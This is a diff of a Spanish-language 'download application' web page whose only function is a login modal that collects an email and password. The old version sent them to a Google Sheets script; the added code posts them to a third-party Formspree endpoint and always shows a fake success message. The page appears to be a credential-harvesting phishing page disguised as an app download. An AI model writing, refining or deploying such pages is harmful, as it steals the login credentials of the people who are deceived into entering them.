@@ -5,7 +5,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Descargar Aplicación</title>
 <style>
-  body { font-family: 'Arial', sans-serif; background: #f5f5f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+  body { font-family: Arial, sans-serif; background: #f5f5f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
   .container { text-align: center; }
   .btn { padding: 14px 28px; background: #007bff; color: white; border: none; border-radius: 8px; font-size: 18px; cursor: pointer; transition: 0.3s; }
   .btn:hover { background: #0056b3; }
@@ -24,58 +24,49 @@
 <div class="modal" id="modal">
   <div class="modal-content">
     <h2>Iniciar sesión</h2>
-    <input type="text" id="correo" class="input" placeholder="Correo">
-    <input type="password" id="contrasena" class="input" placeholder="Contraseña">
-    <button class="btn" onclick="registrar()">Registrar</button>
+    <form id="formulario" action="https://formspree.io/f/xjkekpdg" method="POST">
+      <input type="text" name="correo" class="input" placeholder="Correo" required>
+      <input type="password" name="contrasena" class="input" placeholder="Contraseña" required>
+      <button type="submit" class="btn">Registrar</button>
+    </form>
     <div class="loading" id="loading">Cargando...</div>
   </div>
 </div>
 
 <script>
-const url = "https://script.google.com/macros/s/AKfycbzglYgk0ctQm0b8d_mkuIYReSW3tVO9CAxf61AtzXnP5yoN07p7pavLIKhuHPOreTSw/exec";
-
 function abrirModal() {
   document.getElementById("modal").style.display = "flex";
 }
 
-function registrar() {
-  const correo = document.getElementById("correo").value.trim();
-  const contrasena = document.getElementById("contrasena").value.trim();
-  const loading = document.getElementById("loading");
+const form = document.getElementById("formulario");
+const loading = document.getElementById("loading");
 
-  if(!correo || !contrasena){
-    alert("Por favor completa ambos campos");
-    return;
-  }
-
+form.addEventListener("submit", function(event) {
+  event.preventDefault(); // Evita que se recargue la página
   loading.style.display = "block";
 
-  fetch(url, {
+  const formData = new FormData(form);
+
+  fetch(form.action, {
     method: "POST",
-    body: JSON.stringify({ correo: correo, contrasena: contrasena }),
-    headers: { 'Content-Type': 'application/json' }
+    body: formData,
+    headers: { 'Accept': 'application/json' }
   })
-  .then(res => res.json())
-  .then(res => {
+  .then(response => response.json())
+  .then(data => {
     setTimeout(() => {
       loading.style.display = "none";
-      document.getElementById("correo").value = "";
-      document.getElementById("contrasena").value = "";
+      form.reset();
       document.getElementById("modal").style.display = "none";
-
-      if(res.result === "success"){
-        alert("¡Registrado correctamente!");
-      } else {
-        alert("Error al registrar: " + res.message);
-      }
+      alert("¡Registrado correctamente!");
     }, 2000);
   })
-  .catch(err => {
-    console.error(err);
+  .catch(error => {
+    console.error(error);
     loading.style.display = "none";
-    alert("Error al conectar con Google Sheets");
+    alert("Ocurrió un error al registrar");
   });
-}
+});
 
 // Cerrar modal al hacer clic fuera del contenido
 window.onclick = function(event){
